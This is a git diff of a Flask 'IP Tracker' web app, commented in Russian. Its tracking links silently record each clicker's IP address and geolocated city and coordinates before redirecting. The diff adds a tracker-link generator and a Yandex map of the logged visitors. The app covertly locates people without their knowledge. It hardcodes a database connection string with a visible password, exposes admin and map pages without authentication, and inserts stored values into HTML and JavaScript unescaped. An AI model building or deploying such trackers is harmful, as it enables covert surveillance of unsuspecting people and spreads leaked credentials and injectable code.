@@ -10,7 +10,7 @@ app = Flask(__name__)
 # Целевая ссылка по умолчанию
 DEFAULT_TARGET_URL = "https://2gis.ru"
 
-# Подключение к Neon PostgreSQL
+# ⚠️ ЗАМЕНИ ЭТУ СТРОКУ НА СВОЮ ИЗ NEON (с sslmode=require)
 DATABASE_URL = "postgresql://neondb_owner:npg_Afov3TP1JjsI@ep-shy-pine-ahtyw75v-pooler.c-3.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"
 
 def init_db():
@@ -33,13 +33,9 @@ def init_db():
     conn.close()
 
 def get_geo_info(ip):
-    """Получает страну, город и координаты по IP через ipapi.co"""
     try:
         if ip in ('127.0.0.1', 'localhost', '::1'):
-            print(f"[GEO] Local IP: {ip}")
             return {"country": "Local", "country_code": "xx", "city": "Dev", "latitude": 0.0, "longitude": 0.0}
-
-        # Запрос к API
         response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=4)
         if response.status_code == 200:
             data = response.json()
@@ -48,7 +44,6 @@ def get_geo_info(ip):
             code = (data.get("country_code") or "xx").lower()
             lat = float(data.get("latitude", 0.0))
             lon = float(data.get("longitude", 0.0))
-            print(f"[GEO] Success for {ip}: {country}, {city}, {lat}, {lon}")
             return {
                 "country": country,
                 "country_code": code,
@@ -56,13 +51,8 @@ def get_geo_info(ip):
                 "latitude": lat,
                 "longitude": lon
             }
-        else:
-            print(f"[GEO] API returned {response.status_code} for {ip}")
     except Exception as e:
-        print(f"[GEO] Error for {ip}: {e}")
-
-    # Fallback
-    print(f"[GEO] Fallback for {ip}")
+        pass
     return {"country": "Unknown", "country_code": "xx", "city": "Unknown", "latitude": 0.0, "longitude": 0.0}
 
 @app.route('/track')
@@ -71,7 +61,6 @@ def track():
     if not target_url.startswith(('http://', 'https://')):
         target_url = 'https://' + target_url
 
-    # Получаем реальный IP
     xff = request.headers.get('X-Forwarded-For', '')
     ips = [ip.strip() for ip in xff.split(',') if ip.strip()]
     ip = request.remote_addr
@@ -90,7 +79,6 @@ def track():
 
     geo = get_geo_info(ip)
 
-    # Сохраняем в БД
     conn = psycopg2.connect(DATABASE_URL)
     with conn.cursor() as cur:
         cur.execute(
@@ -107,7 +95,7 @@ def home():
     return '''
     <h2>✅ IP Tracker</h2>
     <p>Пример: <a href="/track?url=https://google.com">/track?url=https://google.com</a></p>
-    <p>Админка: <a href="/admin">/admin</a> | Карта: <a href="/map">/map</a></p>
+    <p>Админка: <a href="/admin">/admin</a> | Карта: <a href="/map">/map</a> | Яндекс Карта: <a href="/yandex-map">/yandex-map</a></p>
     '''
 
 @app.route('/admin')
@@ -126,14 +114,24 @@ def admin_panel():
         <title>IP Tracker Admin</title>
         <style>
             body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 20px; background: #f9f9fb; }
-            h1 { color: #2c3e50; }
+            h1, h2 { color: #2c3e50; }
             table { width: 100%; border-collapse: collapse; margin-top: 20px; }
             th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
             th { background: #f1f2f6; font-weight: 600; }
             tr:hover { background: #f8f9fa; }
-            .flag { font-size: 18px; width: 24px; display: flex; align-items: center; justify-content: center; height: 24px; }
+            .flag { 
+                font-size: 18px; 
+                width: 24px; 
+                display: flex; 
+                align-items: center; 
+                justify-content: center; 
+                height: 24px; 
+            }
             .time { color: #7f8c8d; font-size: 0.9em; }
             .link { color: #3498db; text-decoration: underline; }
+            input[type="text"] { padding: 8px; width: 100%; max-width: 500px; margin: 5px 0; box-sizing: border-box; }
+            input[type="submit"] { padding: 8px 16px; background: #3498db; color: white; border: none; cursor: pointer; margin-top: 10px; }
+            input[type="submit"]:hover { background: #2980b9; }
         </style>
     </head>
     <body>
@@ -158,7 +156,6 @@ def admin_panel():
             flag = ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc.upper())
         else:
             flag = '🌐'
-
         html += f'''
             <tr>
                 <td><code>{row['ip_address']}</code></td>
@@ -173,6 +170,15 @@ def admin_panel():
     html += '''
             </tbody>
         </table>
+
+        <h2>🔗 Генератор трекер-ссылок</h2>
+        <form method="GET" action="/track">
+            <label for="url">Введите целевую ссылку:</label><br>
+            <input type="text" id="url" name="url" value="https://google.com" required>
+            <br>
+            <input type="submit" value="Получить трекер-ссылку">
+        </form>
+        <p>Пример: <code>https://ip-tracker-ijlf.onrender.com/track?url=ВАША_ССЫЛКА</code></p>
     </body>
     </html>
     '''
@@ -186,7 +192,6 @@ def map_page():
         rows = cur.fetchall()
     conn.close()
 
-    # Генерируем JavaScript для Leaflet
     markers_js = ""
     for row in rows:
         if row['latitude'] != 0.0 and row['longitude'] != 0.0:
@@ -195,7 +200,7 @@ def map_page():
                 .bindPopup("<b>{row['ip_address']}</b><br>{row['country']} — {row['city']}<br>{row['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}");
             """
 
-    html = f'''
+    return f'''
     <!DOCTYPE html>
     <html>
     <head>
@@ -215,16 +220,59 @@ def map_page():
             L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{
                 attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
             }}).addTo(map);
-
-            // Добавляем маркеры
             {markers_js}
         </script>
     </body>
     </html>
     '''
-    return html
+
+@app.route('/yandex-map')
+def yandex_map_page():
+    conn = psycopg2.connect(DATABASE_URL)
+    with conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("SELECT ip_address, country, city, latitude, longitude, timestamp FROM clicks WHERE latitude != 0 AND longitude != 0 ORDER BY id DESC LIMIT 100")
+        rows = cur.fetchall()
+    conn.close()
+
+    markers_js = ""
+    for row in rows:
+        if row['latitude'] != 0.0 and row['longitude'] != 0.0:
+            markers_js += f"""
+            var placemark = new ymaps.Placemark([{row['latitude']}, {row['longitude']}], {{
+                balloonContent: "<b>{row['ip_address']}</b><br>{row['country']} — {row['city']}<br>{row['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}"
+            }});
+            myMap.geoObjects.add(placemark);
+            """
+
+    return f'''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="utf-8">
+        <title>IP Tracker Yandex Map</title>
+        <script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>
+        <style>
+            body {{ margin: 0; padding: 0; }}
+            #map {{ height: 100vh; width: 100%; }}
+        </style>
+    </head>
+    <body>
+        <div id="map"></div>
+        <script>
+            ymaps.ready(function () {{
+                var myMap = new ymaps.Map('map', {{
+                    center: [0, 0],
+                    zoom: 2
+                }});
+                {markers_js}
+            }});
+        </script>
+    </body>
+    </html>
+    '''
 
 if __name__ == '__main__':
     init_db()
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
